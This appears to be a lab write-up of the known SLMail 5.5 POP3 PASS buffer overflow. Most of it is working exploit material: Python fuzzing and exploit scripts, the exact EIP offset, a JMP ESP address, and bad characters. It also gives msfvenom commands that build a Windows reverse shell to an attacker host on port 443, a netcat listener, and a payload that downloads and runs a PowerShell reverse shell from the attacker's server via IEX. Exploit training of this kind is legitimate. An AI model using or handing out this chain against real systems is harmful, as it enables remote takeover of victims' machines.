# SLMail 5.5 Buffer Overflow


## Preparing VM

Get a [**32 bit Windows machine**](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/). 
Import to VirtualBox and install [**SLMail 5.5**](https://github.com/R4v3nG/Seattle-Lab-Mail-SLmail-5.5-POP3-PASS-Remote-Buffer-Overflow).

Then add a rule to the Windows firewall to open 110 port that exposes a POP3 service.

Additionally install [**Immunity Debugger**](https://github.com/kbandla/ImmunityDebugger) 
to extract information about registers to sucessfully exploit the Buffer Overflow 
vulnerability.

We will also need [mona.py](https://github.com/corelan/mona) that we need to place inside
PyCommands folder of Immunity Debugger.

## Scanning machine

* First we take a look to open ports: `nmap -sS -p- -n -v -oG scanPorts 192.168.1.56`. This
should notify us about port 110.
* Then we could try to extract information about service exposed in that port: `nmap -sV -p22,110 -n -oG services 192.168.1.56`. We should see SLMAIL POP3 service.

## Inspecting POP3 service

We could just perform a telnet to the VM and port 110: `telnet 192.168.1.56 110`. We see
that we can send data using USER command like: `USER [username]`. Additionally, after 
specifying the username we could provide a password by using PASS command: `PASS [password].
This means that we have to possible inputs to tests buffer overflow.

## Exploiting Buffer Overflow

### Determining if Buffer Overflow exists

We built a simple python application in order to determine if we have any Buffer Overflow
vulnerability.

```python
#!/usr/bin/python3      
# coding: utf-8         
                        
import sys, socket      
                        
                        
if len(sys.argv) != 2:    
  print("\nUsage: python {} <host-ip>\n".format(sys.argv[0]))    
  sys.exit(1)           
                        
buffer = ["A"]          
ipAddress = sys.argv[1]    
                        
port = 110              
contador = 100          
                        
while len(buffer) < 30:    
  buffer.append("A"*contador)    
  contador += 200       
                        
for strings in buffer:    
  try:                  
    print("Sending {} bytes...".format(len(strings)))    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                               
    s.connect((ipAddress, port))                                                        
    s.recv(1024)                                                                        
    s.send("USER {}\r\n".format(strings))                                               
    s.recv(1024)                                                                        
    s.close()                                                                           
  except:                                                                               
    print("\nConnection error...\n")                                                    
    sys.exit(0)
```

In first instance, we try to exploit Buffer Overflow when sending username as input.
We increase by 200 bytes the size of our input data trying to identify the interval where
Overflow is reached. Before executing the program we attach Immunity Debugger to the SLMail
process to take a look to the registers.

As we don't get any error we do a small change in our program to see if Buffer Overflow is
caused by password input. 

```python
for strings in buffer:    
  try:                  
    print("Sending {} bytes...".format(len(strings)))    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                               
    s.connect((ipAddress, port))                                                        
    s.recv(1024)                                                                        
    s.send("USER test\r\n")                                                             
    s.recv(1024)
    s.send("PASS {}\r\n".format(strings))
    s.recv(1024)
    s.close()                                                                           
  except:                                                                               
    print("\nConnection error...\n")                                                    
    sys.exit(0)
```

So now, we're sending both commands USER and PASS but we're trying to detect the Buffer 
Overflow during password input.

This time, after sending 2700 bytes we could see that Buffer Overflow takes place as we
get a breakpoint at Immunity Debugger were we see that EIP registry is 0x41414141 that is
AAAA. So we know Buffer Overflow takes place between 2500 bytes and 2700 bytes.

To confirm that we could just simplify our python program like this:

```python
#!/usr/bin/python3    
# coding: utf-8    
    
import sys, socket    
    
    
if len(sys.argv) != 2:    
  print("\nUsage: python {} <host-ip>\n".format(sys.argv[0]))    
  sys.exit(1)    
    
payload = "A"*2700    
ipAddress = sys.argv[1]    
    
port = 110    
    
try:    
  print("Sending 2700 bytes...")                         
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
  s.connect((ipAddress, port))    
  s.recv(1024)    
  s.send("USER test\r\n")    
  s.recv(1024)    
  s.send("PASS {}\r\n".format(payload))      
  s.recv(1024)      
  s.close()         
except:    
  print("\nConnection error...\n")    
  sys.exit(0)
```

If we execute again the program we could see that Buffer Overflow is reproducible with 2700
bytes.

### Get exact buffer limit

Now we just have an approximate value of buffer size but we need the exact value to match
buffer and the override EIP registry. So we need a pattern that allows us to identify this
size. We use pattern_create tool from Metasploit.

```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700```

After that we just place the output of this command as input instead of our set of "A"
characters.

Now we see that EIP takes the value 0x39694438 so we could convert this with a simple echo
(considering that we're talking about Little Endian) ```echo "\0x38\0x44\0x69\0x39"```. 
The value corresponds to 8Di9. So using patter_offset tool we can get the exact buffer size.

```/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 8Di9```

This gives us an exact value of 2606 bytes for buffer.

To test that the buffer size value is correct, we will modify payload as follows:

```payload = "A"*2606 + "C"*4```

So, we will fill all buffers with  "A" and then we will override EIP with "C" to be able
to identify the change of the registry. After that EIP has 0x43434343 as value.

### Inserting the shellcode

First we're going to add some padding to see if we can override ESP. We add a padding of
90 bytes to round values (2700 bytes).

```payload = "A"*2606 + "C"*4 + "B"*90```

Our padding is exact to override ESP, in fact if we use 86 bytes of padding we don't reach
ESP registry.

We already know that we have at least 90 bytes to inject shellcode but we will try to
increase padding to see if we still have more space without overriding EIP.

After increasing buffer in steps of 100 bytes we figure out that we have at least 500 bytes 
to set the shellcode.

We just need to identify badchars (255 characters) mediante by modifying our payload:

```python
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = "A"*2606 + "C"*4 + badchars + "B"*255
```

| Execution | Badchar |
|-----------|---------|
|     1     |   0x0a  |
|     2     |   0x0d  |
|     3     |   END   |

We can just generate our payload as a tcp reverse shell for a 32 bit windows and taking
into account the detected badchars and 0x00 (that is going to be considered as a badchar)

```
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.57 lport=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
```

Finally, we modify our payload to insert the shellcode and giving 16 bytes of NOP operations
as shellcode needs some extra space to be decoded.

We just need to use mona command in Immunity Debugger to find a JMP instruction to ESP 
without ASLR activated and with run permissions. So we execute: ```!mona modules```.

This should give as a complete list of modules where it is possible to see if they have or
not ASLR activated.

To find exact instructions that jump to ESP we could use nasm_shell utility to get the
operation code:

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
jmp esp
```

This command should give us FFE4 as OPCode so we could use mona again to find JMP ESP 
instructions:

```
!mona find -s "\xff\xe4" -m SLMFC.DLL
```

We can use for example 0x5f4a358f that seems to be a valid instruction. So we just need
to change EIP value as follows:

```python
payload = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + reverse_shell + "B"*100
```

### Final test

So now it is just time to test the shellcode. We listen on port 443 with netcat:

```nc â€“lvp 443```

And then we execute the payload and we should get access to the machine.

The problem here is that if we close session and try to exploit again the Buffer Overflow we
won't get access again because process is corrupted. So we could try as alternative the
following shellcode that creates a new thread causing that every time we close session
what dies is the thread and not the parent process.

```msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.57 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c```

### Going a bit further

Optimize a little bit the script by replacing NOP for the following operation: ```SUB ESP,0x10``` that moves ESP registry far enough to allow shellcode to be decoded.

We use nasm_shell utility to extract OPCode. 

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
sub esp,0x10
```

OPCode seems to be 83EC10, so our payload will look like this:

```python
payload = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x83\xEC\x10" + reverse_shell + "B"*100
```

We could also reduce the payload size by using [Nishang Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). We should add at
the end of the script the following line to directly invoke the revershell:

```
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.57 -Port 443
```

We also remove the script to be PS.ps1 to reduce even more the payload size. Now we should
serve the script using (for example) a Python server that serves at 8000 port by default.

```python -m SimpleHTTPServer```

So now we create a payload to get this script from the victim machine as follows:

```
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.57:8000/PS.ps1')" -f c -a x86 --platform windows EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

We reduced the shellcode size and additionally we get a reverse powershell.
